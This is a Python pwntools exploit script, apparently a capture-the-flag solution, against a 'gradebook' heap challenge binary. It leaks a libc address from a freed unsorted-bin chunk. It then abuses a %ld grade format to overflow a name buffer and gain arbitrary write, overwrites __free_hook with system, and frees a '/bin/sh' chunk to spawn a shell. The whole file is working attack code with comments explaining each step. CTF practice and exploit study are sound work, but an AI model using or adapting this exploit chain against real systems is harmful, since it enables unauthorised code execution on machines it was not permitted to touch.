from pwn import *

p = 0
pname = b"./gradebook"

context.log_level = "DEBUG"

script = '''

b *lookup+67
b *update_name+181

'''

## Prims

def add_stud(id, size, name):
    p.sendlineafter("> ", "1")
    p.sendafter("id: ", p64(id))
    p.sendlineafter("length: ", str(size))
    p.sendafter("name: ", name)

def list_studs():
    p.sendlineafter("> ", "2")

def update_grade(id, grade):
    p.sendlineafter("> ", "3")
    p.sendafter("id: ", p64(id))
    p.sendlineafter("grade: ", str(grade))
    
def update_name(id, name):
    p.sendlineafter("> ", "4")
    p.sendafter("id: ", p64(id))
    p.sendafter("name: ", name)

def close_grades():
    p.sendlineafter("> ", "5")

def main():
    global p
    p = process(pname)
    #p = remote("ctf.k3rn3l4rmy.com", 2250)

    libc = ELF("./libc.so.6")

    gdb.attach(p, script)
    
    ## Leaks
    # Use the fact that only the first 8 bytes of the name buffer are cleared - if it goes into unsorted bin we get another main_arena ptr at bk as well. If we fill the first 8 bytes after the free, we can 
    # print out this ptr.

    add_stud(0, 0x500, b"DONOTMATTER")
    add_stud(1, 0x20, b"DONOTMATTER")
    close_grades()
    
    add_stud(0, 0x500, b"A"*8)
    list_studs()
    p.recvuntil(b"A"*8)
    print(hex(leak := u64(p.recv(6) + b"\x00"*2)))
    libc.address = leak - (0x1ebb80+96)
    print(f"[*] Got libc base: {hex(libc.address)}")
    
    ## Get muh arbitrary write, use the fact that %ld is used as a format spec in update_grade to overwrite not only the grade (whats meant to happen) but the name length too. We then use that massive overflow
    # to write data into the student structure this name buffer belongs to, overwriting the name and giving us arbitrary write.
    
    # This gets freed first
    add_stud(1, 32, b"/bin/sh\x00")

    update_grade(0, 0xffffffffffffffff)
    update_name(0, 
            
            b"A"*0x500 +
            p64(0) +
            p64(0x20) +

            p64(0) + 
            # grade
            p32(0xffffffff) +
            # length
            p32(0x100) +
            # name
            p64(libc.symbols['__free_hook'])
            )
    
    # Write &system into name (__free_hook)
    update_name(0, p64(libc.symbols['system']))
    # free all chunks, thus getting shellz
    close_grades()

    p.interactive()

if __name__ == "__main__":
    main()
